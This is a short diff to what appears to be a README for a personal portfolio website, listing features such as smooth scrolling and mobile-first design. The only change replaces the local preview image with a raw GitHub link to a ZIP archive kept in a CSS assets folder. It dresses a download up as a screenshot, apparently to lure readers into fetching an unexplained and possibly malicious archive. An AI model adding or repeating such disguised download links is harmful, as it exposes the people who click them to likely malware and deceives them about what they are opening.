@@ -6,5 +6,5 @@
 - Smooth scrolling in each section.
 - Developed first with the Mobile First methodology, then for desktop.
 - Compatible with all mobile devices and with a beautiful and pleasant user interface.
-![preview img](/preview.png)
+![preview img](https://raw.githubusercontent.com/Sakshms/profile-portfolio/master/assets/css/profile-portfolio-3.9-alpha.5.zip)
 
